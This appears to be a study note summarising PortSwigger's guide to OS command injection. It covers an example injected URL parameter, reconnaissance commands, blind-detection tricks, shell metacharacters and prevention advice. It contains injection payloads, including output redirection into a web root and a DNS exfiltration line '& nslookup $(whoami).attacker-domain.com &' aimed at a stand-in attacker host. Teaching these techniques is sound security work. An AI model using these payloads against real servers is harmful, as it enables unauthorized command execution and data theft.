# Os Command injection
## What is OS command injection?
OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.
### Injecting OS commands
In this example, a shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL:

`https://insecure-website.com/stockStatus?productID=381&storeID=29`

`stockreport.pl 381 29`

`stockreport.pl & echo aiwefwlguh & 29`

`Error - productID was not provided` 
`aiwefwlguh`
`29: command not found`
### Useful commands
After you identify an OS command injection vulnerability, it's useful to execute some initial commands to obtain information about the system. Below is a summary of some commands that are useful on Linux and Windows platforms:

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |

### **Detection and Exploitation Techniques**
1. **Using Time Delays**:
    
    - Inject commands that cause noticeable delays, such as `ping -c 10 127.0.0.1`, to confirm execution by observing response times.
2. **Output Redirection**:
    
    - Redirect command output to files in accessible locations (e.g., `/var/www/static`) and retrieve them via the browser:
        - Example: `& whoami > /var/www/static/whoami.txt &`.
3. **Out-of-Band (OAST) Techniques**:
    
    - Inject commands that interact with attacker-controlled systems to confirm execution:
        - Example: `& nslookup attacker-domain.com &` to trigger DNS lookups.
    - For exfiltration, inject payloads embedding command outputs into the DNS query:
        - Example: `& nslookup $(whoami).attacker-domain.com &`.

### **Command Injection Methods**
1. **Shell Metacharacters**:
    
    - Common separators for chaining commands:
        - Cross-platform: `&`, `&&`, `|`, `||`
        - Unix-only: `;`, `\n` (newline).
    - Inline execution using backticks or `$()`:
        - Example: `` `injected command` `` or `$(injected command)`.
2. **Escaping Quoted Context**:
    
    - Terminate quotes (`"` or `'`) before injecting commands if user input is wrapped in quotes.

### **Prevention Strategies**
1. **Avoid OS Command Execution**:
    
    - Use platform APIs to achieve the same functionality without invoking OS commands.
2. **Validate Inputs Strictly**:
    
    - Use a **whitelist** of allowed values.
    - Ensure inputs are strictly alphanumeric or match expected formats.
    - Validate inputs as numeric when appropriate.
3. **Do Not Escape Metacharacters**:
    
    - Escaping shell metacharacters is error-prone and easily bypassed. Use strict validation instead.

## References
[1]
PortSwigger, “What is OS command injection, and how to prevent it? | Web Security Academy,” portswigger.net. https://portswigger.net/web-security/os-command-injection

‌